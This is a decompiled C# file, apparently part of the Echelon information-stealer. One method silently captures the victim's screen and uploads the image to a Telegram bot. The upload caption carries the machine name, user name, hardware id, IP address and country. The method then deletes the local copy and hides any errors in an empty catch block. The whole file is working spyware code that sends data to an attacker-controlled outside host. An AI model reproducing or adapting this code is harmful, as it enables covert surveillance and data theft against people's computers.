using Echelon;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

internal class f
{
	public static void a()
	{
		try
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap bitmap = new Bitmap(width, height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(Global.MyDocuments + "\\Screen" + ".Jpeg", ImageFormat.Jpeg);
			Thread.Sleep(new Random(Environment.TickCount).Next(1000, 3000));
			string text = Global.MyDocuments + "\\Screen" + ".Jpeg";
			byte[] file = File.ReadAllBytes(text);
			string url = string.Concat(Global.ApiUrl, g.d, "/sendDocument?chat_id=", g.e, "&caption= ⚡\ufe0f Address spoofing detected ⚡\ufe0f" + "\n" + Global.date + "\n\ud83d\udc64 " + Environment.MachineName + "/" + Environment.UserName + "\ud83c\udd94 " + Global.GetHwid() + "\n\ud83c\udff4 IP: " + Global.IP + " " + Global.Country());
			SenderAPI.POST(file, text, "application/x-ms-dos-executable", url);
			File.Delete(Global.MyDocuments + "\\Screen" + ".Jpeg");
		}
		catch
		{
		}
	}
}
